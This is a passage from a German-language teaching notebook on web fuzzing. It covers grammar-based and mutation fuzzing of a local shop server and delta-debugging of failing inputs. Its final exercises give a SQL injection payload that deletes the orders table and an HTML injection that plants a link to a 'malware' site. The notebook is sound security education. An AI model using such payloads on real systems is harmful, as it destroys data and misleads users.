    "            print(\"Expanding\", all_terminals(node), \"at minimum cost\")\n",
    "\n",
    "        return self.expand_node_by_cost(node, min)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### AUFGABE\n",
    "1. Ergänze die folgende Grammatik, sodass erwartete URLs generiert werden können.  \n",
    "Eine Beispiel URL könnte so aussehen:\n",
    "`http://localhost:8800/order?item=hoodienavy&name=Erika+Musterfrau&email=e.musterfrau%40example.com&city=Bad+Wildbad&zip=00850`  \n",
    "Bedenke, dass nur der URL-Pfad generiert werden muss. Das Start-Symbol ist `<start>`.  \n",
    "Nutze `crange` und `cgi_encode` um die Zeichen zu kodieren."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR: Grammar = {\n",
    "    \"<start>\": [\"<order>\"],\n",
    "    \"<order>\": [\"/order?item=<item>&name=<name>&email=<email>&city=<city>&zip=<zip>\"],\n",
    "    \"<item>\": [\"tshirtmennavy\", \"tshirtwomennavy\", \"tshirtmenwhite\", \"tshirtwomenwhite\", \"hoodienavy\", \"hoodiegrey\"],\n",
    "    \"<name>\": [cgi_encode(\"Erika Musterfrau\"), cgi_encode(\"Max Mustermann\")],\n",
    "    \"<email>\": [cgi_encode(\"e.musterfrau@example.com\"), cgi_encode(\"max_mustermann@example.com\")],\n",
    "    \"<city>\": [\"Stuttgart\", cgi_encode(\"Bad Wildbad\")],\n",
    "    \"<zip>\": [\"<digit>\" * 5],\n",
    "    \"<digit>\": crange('0', '9')\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. Generiere fünf verschiedene Bestell-URLs basierend auf der Grammatik."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create fuzz inputs\n",
    "order_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)\n",
    "[order_fuzzer.fuzz() for i in range(5)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# use fuzz inputs\n",
    "IPython.core.display.HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz())))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. Teste, ob die Bestellungen korrekt gespeichert wurden, indem du die Datenbank abfragst und die Bestellungen ausgibst."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check\n",
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ... mit unerwarteten Inputs\n",
    "In dieser Sektion wird das Fuzzing mit unerwarteten Inputs durchgeführt.\n",
    "\n",
    "Der Code beinhaltet die Erstellung eines Seeds, die Mutation dieses Seeds, das Fuzzing bis zum Auftreten eines Fehlers und die Minimierung des fehlerhaften Pfads mit Delta-Debugging.\n",
    "\n",
    "1. **Seed erstellen**: Ein initialer Fuzzing-Input (Seed) wird aus der Grammatik generiert.\n",
    "2. **Seed mutieren**: Funktionen zur Mutation des Seeds werden definiert, die zufällig Zeichen löschen, einfügen oder flippen.\n",
    "3. **MutationFuzzer erstellen**: Ein Fuzzer wird erstellt, der den Seed mutiert, um neue Fuzzing-Eingaben zu erzeugen.\n",
    "4. **Fuzzing durchführen**: Der Fuzzer wird verwendet, um neue Eingaben zu generieren und bis zum Auftreten eines Fehlers zu testen.\n",
    "5. **Fehlerhaften Pfad minimieren**: Der fehlerhafte Pfad wird mit Delta-Debugging minimiert, um den kleinsten Eingabe zu finden, der den Fehler verursacht."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create seed\n",
    "order_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)\n",
    "seed = order_fuzzer.fuzz()\n",
    "seed"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### AUFGABE\n",
    "Im Folgenden sollen die Funktionen, die benötigt werden um den seed zu mutieren implementiert werden.\n",
    "Die Funktionen sollen wie folgt implementiert werden:\n",
    "- `delete_random_character`: Löscht ein zufälliges Zeichen aus der Eingabe.\n",
    "- `insert_random_character`: Fügt ein zufälliges Zeichen in die Eingabe ein.\n",
    "- `flip_random_character`: Ändert ein zufälliges Zeichen in der Eingabe.\n",
    "Die Funktion `mutate` soll eine der drei Mutationen zufällig auswählen und auf die Eingabe anwenden."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# mutate seed    \n",
    "def delete_random_character(s: str) -> str:\n",
    "    if s == \"\":\n",
    "        return s\n",
    "\n",
    "    pos = random.randint(0, len(s) - 1)\n",
    "    return s[:pos] + s[pos + 1:]\n",
    "\n",
    "def insert_random_character(s: str) -> str:\n",
    "    pos = random.randint(0, len(s))\n",
    "    random_character = chr(random.randrange(32, 127))\n",
    "    return s[:pos] + random_character + s[pos:]\n",
    "\n",
    "def flip_random_character(s):\n",
    "    if s == \"\":\n",
    "        return s\n",
    "\n",
    "    pos = random.randint(0, len(s) - 1)\n",
    "    c = s[pos]\n",
    "    bit = 1 << random.randint(0, 6)\n",
    "    new_c = chr(ord(c) ^ bit)\n",
    "    return s[:pos] + new_c + s[pos + 1:]\n",
    "\n",
    "def mutate(s: str) -> str:\n",
    "    mutators = [\n",
    "        delete_random_character,\n",
    "        insert_random_character,\n",
    "        flip_random_character\n",
    "    ]\n",
    "    mutator = random.choice(mutators)\n",
    "    return mutator(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class MutationFuzzer(Fuzzer):\n",
    "    def __init__(self, seed: List[str],\n",
    "                 min_mutations: int = 2,\n",
    "                 max_mutations: int = 10) -> None:\n",
    "        \n",
    "        self.seed = seed\n",
    "        self.min_mutations = min_mutations\n",
    "        self.max_mutations = max_mutations\n",
    "        self.reset()\n",
    "\n",
    "    def reset(self) -> None:\n",
    "        self.population = self.seed\n",
    "        self.seed_index = 0\n",
    "\n",
    "    def create_candidate(self) -> str:\n",
    "        candidate = random.choice(self.population)\n",
    "        trials = random.randint(self.min_mutations, self.max_mutations)\n",
    "        for i in range(trials):\n",
    "            candidate = self.mutate(candidate)\n",
    "        return candidate\n",
    "\n",
    "    def fuzz(self) -> str:\n",
    "        if self.seed_index < len(self.seed):\n",
    "            # Still seeding\n",
    "            self.inp = self.seed[self.seed_index]\n",
    "            self.seed_index += 1\n",
    "        else:\n",
    "            # Mutating\n",
    "            self.inp = self.create_candidate()\n",
    "        return self.inp\n",
    "\n",
    "    def mutate(self, inp: str) -> str:\n",
    "        return mutate(inp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create fuzzing inputs\n",
    "mutate_order_fuzzer = MutationFuzzer([seed], min_mutations=1, max_mutations=1)\n",
    "[mutate_order_fuzzer.fuzz() for i in range(5)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# fuzz till error\n",
    "while True:\n",
    "    path = mutate_order_fuzzer.fuzz()\n",
    "    url = urljoin(httpd_url, path)\n",
    "    r = requests.get(url)\n",
    "    if r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# get path that caused error\n",
    "failing_path = path\n",
    "failing_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# minimize with delta debugging\n",
    "class WebRunner(Runner):\n",
    "    def __init__(self, base_url: Optional[str] = None):\n",
    "        self.base_url = base_url\n",
    "\n",
    "    def run(self, url: str) -> Tuple[str, str]:\n",
    "        if self.base_url is not None:\n",
    "            url = urljoin(self.base_url, url)\n",
    "\n",
    "        r = requests.get(url)\n",
    "        if r.status_code == HTTPStatus.OK:\n",
    "            return url, Runner.PASS\n",
    "        elif r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n",
    "            return url, Runner.FAIL\n",
    "        else:\n",
    "            return url, Runner.UNRESOLVED\n",
    "        \n",
    "web_runner = WebRunner(httpd_url)\n",
    "web_runner.run(failing_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Reducer:\n",
    "    def __init__(self, runner: Runner, log_test: bool = False) -> None:\n",
    "        self.runner = runner\n",
    "        self.log_test = log_test\n",
    "        self.reset()\n",
    "\n",
    "    def reset(self) -> None:\n",
    "        self.tests = 0\n",
    "\n",
    "    def test(self, inp: str) -> Outcome:\n",
    "        result, outcome = self.runner.run(inp)\n",
    "        self.tests += 1\n",
    "        if self.log_test:\n",
    "            print(\"Test #%d\" % self.tests, repr(inp), repr(len(inp)), outcome)\n",
    "        return outcome\n",
    "\n",
    "    def reduce(self, inp: str) -> str:\n",
    "        self.reset()\n",
    "        return inp\n",
    "\n",
    "class CachingReducer(Reducer):\n",
    "    def reset(self):\n",
    "        super().reset()\n",
    "        self.cache = {}\n",
    "\n",
    "    def test(self, inp):\n",
    "        if inp in self.cache:\n",
    "            return self.cache[inp]\n",
    "\n",
    "        outcome = super().test(inp)\n",
    "        self.cache[inp] = outcome\n",
    "        return outcome\n",
    "\n",
    "class DeltaDebuggingReducer(CachingReducer):\n",
    "    \n",
    "    def reduce(self, inp: str) -> str:\n",
    "        self.reset()\n",
    "        assert self.test(inp) != Runner.PASS\n",
    "\n",
    "        n = 2     # Initial granularity\n",
    "        while len(inp) >= 2:\n",
    "            start = 0.0\n",
    "            subset_length = len(inp) / n\n",
    "            some_complement_is_failing = False\n",
    "\n",
    "            while start < len(inp):\n",
    "                complement = inp[:int(start)] + \\\n",
    "                    inp[int(start + subset_length):]\n",
    "\n",
    "                if self.test(complement) == Runner.FAIL:\n",
    "                    inp = complement\n",
    "                    n = max(n - 1, 2)\n",
    "                    some_complement_is_failing = True\n",
    "                    break\n",
    "\n",
    "                start += subset_length\n",
    "\n",
    "            if not some_complement_is_failing:\n",
    "                if n == len(inp):\n",
    "                    break\n",
    "                n = min(n * 2, len(inp))\n",
    "\n",
    "        return inp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# finding failing input\n",
    "minimized_path = DeltaDebuggingReducer(web_runner).reduce(failing_path)\n",
    "minimized_path"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Web-Attacken auf den Webserver\n",
    "In dieser Sektion wird eine Web-Attacke auf den Webserver durchgeführt.\n",
    "\n",
    "### SQL-Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# extends grammar by copying it and adding new rules\n",
    "def extend_grammar(grammar: Grammar, extension: Grammar = {}) -> Grammar:\n",
    "    new_grammar = copy.deepcopy(grammar)\n",
    "    new_grammar.update(extension)\n",
    "    return new_grammar"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Die folgenden Zeilen sind ein Beispiel dafür, wie ein SQL command aussehen kann."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "values: Dict[str, str] = {\n",
    "    \"item\": \"tshirtmenwhite\",\n",
    "    \"name\": \"Erika Musterfrau\",\n",
    "    \"email\": \"erika.musterfrau@example.com\",\n",
    "    \"city\": \"Stuttgart\",\n",
    "    \"zip\": \"70190\"\n",
    "}\n",
    "\n",
    "sql_command = (\"INSERT INTO orders \" +\n",
    "               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### AUFGABE\n",
    "Passe nun den Wert des Namens so an, dass die Datenbank gelöscht wird und die SQL-Injection erfolgreich ist."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# design the name field to be a SQL injection\n",
    "values[\"name\"] = \"Erika', 'x', 'x', 'x'); DELETE FROM orders; -- \"\n",
    "\n",
    "sql_command = (\"INSERT INTO orders \" +\n",
    "               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# extend the grammar\n",
    "ORDER_GRAMMAR_WITH_SQL_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode(\"Erika', 'x', 'x', 'x'); DELETE FROM orders; --\")],\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create fuzzing inputs\n",
    "sql_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_SQL_INJECTION)\n",
    "order_with_injected_sql = sql_injection_fuzzer.fuzz()\n",
    "order_with_injected_sql"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check for success\n",
    "print(db.execute(\"SELECT * FROM orders\").fetchall())\n",
    "\n",
    "contents = webbrowser(urljoin(httpd_url, order_with_injected_sql))\n",
    "\n",
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### HTML Injection\n",
    "##### AUFGABE\n",
    "Passe den Wert des Namens so an, dass ein externer Link in der Bestellbestätigung angezeigt wird."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# extend the grammar\n",
    "ORDER_GRAMMAR_WITH_HTML_INJECTION: Grammar = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode('''\n",
    "    Erika Mustermann<p>\n",
    "    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n",
    "    </p>\n",
    "    ''')],\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create fuzzing inputs\n",
    "html_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_HTML_INJECTION)\n",
    "order_with_injected_html = html_injection_fuzzer.fuzz()\n",
    "order_with_injected_html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check for success\n",
    "IPython.core.display.HTML(webbrowser(urljoin(httpd_url, order_with_injected_html)))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
